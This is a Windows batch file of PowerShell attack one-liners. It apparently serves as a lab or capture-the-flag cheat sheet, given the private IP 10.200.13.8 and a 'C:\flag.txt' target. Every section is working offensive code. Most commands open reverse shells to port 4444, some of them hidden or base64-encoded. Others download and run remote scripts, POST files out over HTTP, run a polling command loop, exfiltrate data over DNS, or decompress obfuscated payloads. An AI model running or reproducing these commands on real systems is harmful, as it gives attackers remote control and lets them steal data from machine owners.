
@echo off

:: PowerShell reverse shells
powershell -c "$c=New-Object System.Net.Sockets.TCPClient('10.200.13.8',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

powershell -nop -W Hidden -noni -ep bypass -c "$client=New-Object System.Net.Sockets.TCPClient('10.200.13.8',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.200.13.8:8000/shell.ps1')"

powershell -enc JGNsaWVudD1OZXctT2JqZWN0U3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMjAwLjEzLjgiLDQ0NDQpOyRzdHJlYW09JGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcz0wLi42NTUzNXwlezB9O3doaWxlKCgkaT0kc3RyZWFtLlJlYWQoJGJ5dGVzLDAsJGJ5dGVzLkxlbmd0aCkpLW5lMCl7OyRkYXRhPShOZXctT2JqZWN0LVR5cGVOYW1lU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCRpKTskc2VuZGJhY2s9KGlleCRkYXRhMj4mMXxPdXQtU3RyaW5nKTskc2VuZGJhY2syPSRzZW5kYmFjaysiUFMiKyhwd2QpLlBhdGgrIj4iOyRzZW5kYnl0ZT0oW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ==

:: Netcat style
powershell -c "$sm=(New-Object Net.Sockets.TCPClient('10.200.13.8',4444)).GetStream();$r=New-Object IO.StreamReader($sm);$w=New-Object IO.StreamWriter($sm);$w.AutoFlush=$true;while(($c=$r.ReadLine())){$res=iex $c 2>&1|Out-String;$w.WriteLine($res)}"

:: Web request exfil
powershell -c "iwr http://10.200.13.8:8000/ -Method POST -Body (ls C:\|Out-String)"

powershell -c "iwr http://10.200.13.8:8000/ -Method POST -Body (gc C:\Windows\TEMP\tmp*\test.txt -Raw -EA SilentlyContinue)"

:: Invoke-Expression web shell
powershell -c "while($true){$c=(iwr http://10.200.13.8:8000/cmd -UseBasicParsing).Content;if($c){iwr http://YOUR_IP:8000/result -Method POST -Body (iex $c|Out-String)}sleep 2}"

:: DNS exfil
powershell -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((gc C:\flag.txt)));nslookup $d.YOUR_DOMAIN"

:: Empire launcher
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.200.13.8:8000/launcher.ps1')"

:: Meterpreter style
powershell -c "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('BASE64_PAYLOAD'));IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"

:: Simple callback
powershell -c "Start-Process powershell -ArgumentList '-nop -W Hidden -c iwr http://10.200.13.8:8000/$(hostname) -Method POST -Body (whoami)'"

:: Alternate reverse shell
powershell -c "$t=New-Object Net.Sockets.TcpClient('10.200.13.8',4444);$s=$t.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)};$t.Close()"

:: Compressed reverse shell  
powershell -c "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('BASE64'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"

:: Background job reverse shell
powershell -c "Start-Job {$c=New-Object Net.Sockets.TCPClient('10.200.13.8',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while($i=$s.Read($b,0,$b.Length)){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String)+'PS> ';$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,$sb.Length)}}"